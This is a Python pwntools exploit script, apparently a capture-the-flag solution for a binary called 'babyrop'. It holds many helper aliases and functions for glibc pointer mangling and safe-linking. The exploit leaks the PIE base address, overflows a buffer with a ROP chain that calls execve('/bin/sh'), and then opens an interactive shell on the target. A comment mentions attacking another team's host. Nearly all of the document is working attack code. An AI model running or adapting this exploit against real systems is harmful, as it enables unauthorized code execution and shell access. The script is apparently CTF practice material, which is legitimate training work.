#!/usr/bin/env python3
from pwn import *
import sys

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val



GDB_SCRIPT = f"""
set disassembly-flavor intel
break *main
continue
"""

exe = ELF("./babyrop")
context.binary = exe
context.aslr = False
IP     = 'localhost'   
# IP = host = sys.argv[1]
PORT   = 30000
# PORT = int(sys.argv[2])

# print("I need to attack a team with host: {}".format(host))

def conn():
    # for actual automated script:
    # return remote(IP, PORT)
    if args.LOCAL:
        r = process([exe.path])
        # argv = [ld.path, exe.path]
        # env = {"LD_PRELOAD": libc.path}
        # r = process(argv, env=env)
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

t = conn()
# get PIE leak first
sla(b"Choice: ", str(0xdeadbeef).encode())
ru(b"My cool text: 0x")
leak = int(rl()[:-1].decode(), 16)

PIE_BASE = leak - (0x000055555555605c - 0x0000555555554000)
lhex(PIE_BASE)
BIN_SH_STRING = PIE_BASE + (0x555555556070 - 0x0000555555554000)
POP_RAX = PIE_BASE + 0x133a
POP_RDI = PIE_BASE + 0x1347
MOV_RSI_RDI = PIE_BASE + 0x1354
SYSCALL_RET = PIE_BASE + 0x1363
# trigger buffer overflow in vulnerable_function
PAYLOAD = 0x58 * b'a' # padding
PAYLOAD += flat([
    POP_RDI, 0,
    MOV_RSI_RDI,
    POP_RDI, BIN_SH_STRING,
    POP_RAX, 59,
    SYSCALL_RET
])
sla(b"Choice: ", b"1")
pause()
sla(b"Enter your input: ", PAYLOAD)
it()